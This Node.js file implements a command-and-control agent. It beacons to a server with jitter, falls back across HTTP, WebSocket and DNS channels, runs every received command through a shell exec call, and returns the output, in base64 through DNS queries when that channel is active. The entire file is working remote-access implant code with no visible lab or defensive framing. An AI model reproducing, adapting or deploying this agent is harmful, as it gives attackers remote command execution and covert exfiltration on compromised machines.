const http = require('http');
const url = require('url');
const { exec } = require('child_process');
const { WebSocket } = require('ws');
const { EventEmitter } = require('events');
const { DNSProtocol } = require('./dnsprotocol');

class C2Agent extends EventEmitter {
  constructor(options = {}) {
    super();
    this.serverUrl = options.server || 'http://localhost:8443';
    this.agentId = options.id || `agent-${Math.random().toString(36).slice(2, 8)}`;
    this.beaconInterval = options.interval || 5000;
    this.jitter = options.jitter || 2000;

    const parsed = url.parse(this.serverUrl);
    this.serverHost = parsed.hostname || 'localhost';
    this.serverPort = parseInt(parsed.port, 10) || 8443;
    this.serverProto = parsed.protocol || 'http:';
    this.dnsPort = options.dnsPort || 5353;

    this.ws = null;
    this.dns = null;
    this.running = false;
    this.beaconTimer = null;

    this.channelHealth = {
      http: { ok: true, backoff: 1000, failures: 0 },
      ws: { ok: true, backoff: 1000, failures: 0 },
      dns: { ok: true, backoff: 1000, failures: 0 }
    };

    this.activeChannel = 'http';
    this.channelOrder = ['http', 'ws', 'dns'];
  }

  async start() {
    this.running = true;
    await this._initDNS();
    this._connectWebSocket();
    this._beacon();
    this.emit('started', this.agentId);
  }

  _initDNS() {
    return new Promise((resolve) => {
      this.dns = new DNSProtocol(0, 'client');
      this.dns.start(() => resolve());
    });
  }

  _connectWebSocket() {
    const wsUrl = `ws://${this.serverHost}:${this.serverPort}`;
    try {
      this.ws = new WebSocket(wsUrl);

      this.ws.on('open', () => {
        this.channelHealth.ws.ok = true;
        this.channelHealth.ws.failures = 0;
        this.channelHealth.ws.backoff = 1000;
        this.ws.send(JSON.stringify({ type: 'register', id: this.agentId }));
      });

      this.ws.on('message', (data) => {
        try {
          const msg = JSON.parse(data.toString());
          if (msg.type === 'commands' && msg.commands && msg.commands.length > 0) {
            this._processCommands(msg.commands, 'ws');
          }
          if (msg.type === 'registered') {
            this.emit('connected', this.agentId, 'ws');
          }
        } catch (e) {}
      });

      this.ws.on('close', () => {
        this.channelHealth.ws.ok = false;
        this.channelHealth.ws.failures++;
        const delay = Math.min(this.channelHealth.ws.backoff * 2, 30000);
        this.channelHealth.ws.backoff = delay;
        setTimeout(() => this._connectWebSocket(), delay);
      });

      this.ws.on('error', () => {
        this.channelHealth.ws.ok = false;
        this.channelHealth.ws.failures++;
        this.ws.close();
      });
    } catch (e) {
      this.channelHealth.ws.ok = false;
    }
  }

  _beacon() {
    if (!this.running) return;
    this._sendHeartbeat();
    this._pollCommands();
    const jitterMs = Math.floor(Math.random() * this.jitter * 2) - this.jitter;
    const delay = Math.max(1000, this.beaconInterval + jitterMs);
    this.beaconTimer = setTimeout(() => this._beacon(), delay);
  }

  _sendHeartbeat() {
    const channel = this._getActiveChannel();
    if (channel === 'http') {
      const postData = JSON.stringify({ id: this.agentId, channel: 'http' });
      const options = {
        hostname: this.serverHost,
        port: this.serverPort,
        path: '/heartbeat',
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(postData) }
      };
      const req = http.request(options, (res) => {
        this.channelHealth.http.ok = true;
        this.channelHealth.http.failures = 0;
        this.channelHealth.http.backoff = 1000;
      });
      req.on('error', () => {
        this.channelHealth.http.ok = false;
        this.channelHealth.http.failures++;
      });
      req.write(postData);
      req.end();
    } else if (channel === 'ws' && this.ws && this.ws.readyState === WebSocket.OPEN) {
      try {
        this.ws.send(JSON.stringify({ type: 'heartbeat', id: this.agentId }));
      } catch (e) {
        this.channelHealth.ws.ok = false;
      }
    } else if (channel === 'dns') {
      this.dns.sendQuery(this.agentId, this.serverHost, this.dnsPort, (err, answers) => {
        if (err) {
          this.channelHealth.dns.ok = false;
          this.channelHealth.dns.failures++;
        } else {
          this.channelHealth.dns.ok = true;
          this.channelHealth.dns.failures = 0;
          this.channelHealth.dns.backoff = 1000;
        }
      });
    }
  }

  _pollCommands() {
    const channel = this._getActiveChannel();
    if (channel === 'http') {
      const options = {
        hostname: this.serverHost,
        port: this.serverPort,
        path: `/poll?id=${encodeURIComponent(this.agentId)}`,
        method: 'GET'
      };
      const req = http.request(options, (res) => {
        let body = '';
        res.on('data', (chunk) => { body += chunk; });
        res.on('end', () => {
          try {
            const data = JSON.parse(body);
            if (data.commands && data.commands.length > 0) {
              this._processCommands(data.commands, 'http');
            }
          } catch (e) {}
        });
      });
      req.on('error', () => {});
      req.end();
    } else if (channel === 'ws' && this.ws && this.ws.readyState === WebSocket.OPEN) {
      try {
        this.ws.send(JSON.stringify({ type: 'poll', id: this.agentId }));
      } catch (e) {}
    } else if (channel === 'dns') {
      this.dns.sendQuery(this.agentId, this.serverHost, this.dnsPort, (err, answers) => {
        if (!err && answers.length > 0) {
          this._processCommands(answers, 'dns');
        }
      });
    }
  }

  _getActiveChannel() {
    for (const ch of this.channelOrder) {
      if (this.channelHealth[ch].ok) return ch;
    }
    return this.channelOrder[0];
  }

  _processCommands(commands, channel) {
    for (const cmd of commands) {
      this.executeCommand(cmd, channel);
    }
  }

  executeCommand(cmd, incomingChannel) {
    return new Promise((resolve) => {
      exec(cmd, { timeout: 30000 }, (error, stdout, stderr) => {
        const result = {
          command: cmd,
          stdout: stdout || '',
          stderr: stderr || '',
          exitCode: error ? (error.code || 1) : 0
        };
        this._reportResult(result, incomingChannel);
        this.emit('command-result', cmd, result);
        resolve(result);
      });
    });
  }

  _reportResult(result, channel) {
    if (channel === 'http') {
      const postData = JSON.stringify({ id: this.agentId, result });
      const options = {
        hostname: this.serverHost,
        port: this.serverPort,
        path: '/result',
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(postData) }
      };
      const req = http.request(options);
      req.on('error', () => {});
      req.write(postData);
      req.end();
    } else if (channel === 'ws' && this.ws && this.ws.readyState === WebSocket.OPEN) {
      try {
        this.ws.send(JSON.stringify({ type: 'result', id: this.agentId, result }));
      } catch (e) {}
    } else if (channel === 'dns') {
      const encoded = Buffer.from(JSON.stringify({ id: this.agentId, result })).toString('base64').replace(/=+$/, '');
      this.dns.sendResultQuery(this.agentId, encoded, this.serverHost, this.dnsPort);
    }
  }

  stop() {
    this.running = false;
    if (this.beaconTimer) clearTimeout(this.beaconTimer);
    if (this.ws) {
      try { this.ws.close(); } catch (e) {}
    }
    if (this.dns) this.dns.stop();
  }
}

module.exports = { C2Agent };
